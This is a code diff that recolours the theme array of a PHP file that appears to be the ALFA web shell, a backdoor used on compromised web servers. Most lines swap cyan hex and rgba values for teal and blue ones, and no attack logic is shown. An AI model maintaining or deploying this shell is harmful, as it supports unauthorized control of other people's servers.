@@ -184,7 +184,7 @@ define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"]
 define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
 $GLOBALS['__ALFA_COLOR__'] = array(
 		"shell_border" => array(
-			"key_color" => "#0a0e1a",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".header" => "border: 7px solid {color}",
 				"#meunlist" => "border-color: {color}",
@@ -193,63 +193,63 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 				".foot" => "border-color: {color}",
 			)
 		),
-		"header_vars" => "#00d9ff",
-		"header_values" => "#7dd3fc",
+		"header_vars" => "#27979B",
+		"header_values" => "#67ABDF",
 		"header_on" => "#00ff88",
 		"header_off" => "#ff3366",
-		"header_none" => "#00d9ff",
-		"home_shell" => "#00d9ff",
+		"header_none" => "#27979B",
+		"home_shell" => "#27979B",
 		"home_shell:hover" => array(
-			"key_color" => "#ffffff",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".home_shell:hover" => "color: {color};",
 			)
 		),
-		"back_shell" => "#7dd3fc",
+		"back_shell" => "#67ABDF",
 		"back_shell:hover" => array(
 			"key_color" => "#ffffff",
 			"multi_selector" => array(
 				".back_shell:hover" => "color: {color};",
 			)
 		),
-		"header_pwd" => "#00d9ff",
+		"header_pwd" => "#27979B",
 		"header_pwd:hover" => array(
-			"key_color" => "#ffffff",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".header_pwd:hover" => "color: {color};",
 			)
 		),
-		"header_drive" => "#00d9ff",
+		"header_drive" => "#27979B",
 		"header_drive:hover" => array(
-			"key_color" => "#ffffff",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".header_drive:hover" => "color: {color};",
 			)
 		),
-		"header_show_all" => "#00d9ff",
+		"header_show_all" => "#27979B",
 		"disable_functions" => "#ff3366",
-		"footer_text" => "#00d9ff",
-		"menu_options" => "#00d9ff",
+		"footer_text" => "#27979B",
+		"menu_options" => "#27979B",
 		"menu_options:hover" => array(
-			"key_color" => "#0f172a",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".menu_options:hover" => "background-color: {color};font-weight: unset;",
 			)
 		),
 		"options_list" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				".content_options_holder .header center a" => "color: {color};",
 			)
 		),
 		"options_list:hover" => array(
-			"key_color" => "#ffffff",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".content_options_holder .header center a:hover" => "color: {color};",
 			)
 		),
 		"options_list_header" => array(
-			"key_color" => "#7dd3fc",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".txtfont_header" => "color: {color};",
 			)
@@ -261,13 +261,13 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"Alfa+" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				".alfa_plus" => "color: {color};font-weight: unset;",
 			)
 		),
 		"hidden_shell_text" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				"#hidden_sh a" => "color: {color};",
 			)
@@ -275,7 +275,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 		"hidden_shell_version" => "#ff3366",
 		"shell_name" => "#ff4444",
 		"main_row:hover" => array(
-			"key_color" => "#0f172a",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".main tr:hover" => "background-color: {color};",
 			)
@@ -292,9 +292,9 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 				".main .main_name" => "color: {color};font-weight: unset;",
 			)
 		),
-		"main_size" => "#7dd3fc",
-		"main_modify" => "#7dd3fc",
-		"main_owner_group" => "#7dd3fc",
+		"main_size" => "#67ABDF",
+		"main_modify" => "#67ABDF",
+		"main_owner_group" => "#67ABDF",
 		"main_green_perm" => "#00ff88",
 		"main_red_perm" => "#ff3366",
 		"main_white_perm" => "#e2e8f0",
@@ -306,19 +306,19 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"menu_options:hover" => array(
-			"key_color" => "#0f172a",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".menu_options:hover" => "background-color: {color};font-weight: unset;",
 			)
 		),
 		"minimize_editor_background" => array(
-			"key_color" => "#0f172a",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".minimized-wrapper" => "background-color: {color};",
 			)
 		),
 		"minimize_editor_text" => array(
-			"key_color" => "#7dd3fc",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".minimized-text" => "color: {color};",
 			)
@@ -330,19 +330,19 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"editor_background" => array(
-			"key_color" => "rgba(10, 14, 26, 0.98)",
+			"key_color" => "rgba(0, 1, 23, 0.94)",
 			"multi_selector" => array(
 				".editor-explorer,.editor-modal" => "background-color: {color};",
 			)
 		),
 		"editor_header_background" => array(
-			"key_color" => "rgba(15, 23, 42, 0.96)",
+			"key_color" => "rgba(14, 48, 74, 0.96)",
 			"multi_selector" => array(
 				".editor-header" => "background-color: {color};",
 			)
 		),
 		"editor_header_text" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				".editor-path" => "color: {color};",
 			)
@@ -366,31 +366,31 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"editor_file_info_values" => array(
-			"key_color" => "#7dd3fc",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".filestools" => "color: {color};",
 			)
 		),
 		"editor_history_header" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				".hheader-text,.history-clear" => "color: {color};",
 			)
 		),
 		"editor_history_list" => array(
-			"key_color" => "#7dd3fc",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".editor-file-name" => "color: {color};",
 			)
 		),
 		"editor_history_selected_file" => array(
-			"key_color" => "rgba(0, 120, 200, 0.85)",
+			"key_color" => "rgba(39, 151, 155, 0.85)",
 			"multi_selector" => array(
 				".is_active" => "background-color: {color};",
 			)
 		),
 		"editor_history_file:hover" => array(
-			"key_color" => "#0f172a",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".file-holder > .history:hover" => "background-color: {color};",
 			)
@@ -408,7 +408,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"input_box:hover" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
 			)
@@ -426,26 +426,26 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"select_box:hover" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				"select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
 			)
 		),
 		"button_border" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
 			)
 		),
 		"button:hover" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				"input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
 				".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
 			)
 		),
 		"outputs_text" => array(
-			"key_color" => "#7dd3fc",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".ml1" => "color: {color};",
 			)
@@ -463,7 +463,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"uploader_background" => array(
-			"key_color" => "#0f172a",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".inputfile strong" => "background-color: {color};",
 			)
@@ -475,28 +475,28 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"uploader_text_left" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				".inputfile span" => "color: {color};",
 			)
 		),
 		"uploader:hover" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
 			)
 		),
 		"uploader_progress_bar" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				".up_bar" => "background-color: {color};",
 			)
 		),
-		"mysql_tables" => "#00d9ff",
-		"mysql_table_count" => "#7dd3fc",
-		"copyright" => "#7dd3fc",
+		"mysql_tables" => "#27979B",
+		"mysql_table_count" => "#67ABDF",
+		"copyright" => "#67ABDF",
 		"scrollbar" => array(
-			"key_color" => "#00d9ff",
+			"key_color" => "#1e82b5",
 			"multi_selector" => array(
 				"*::-webkit-scrollbar-thumb" => "background-color: {color};",
 			)
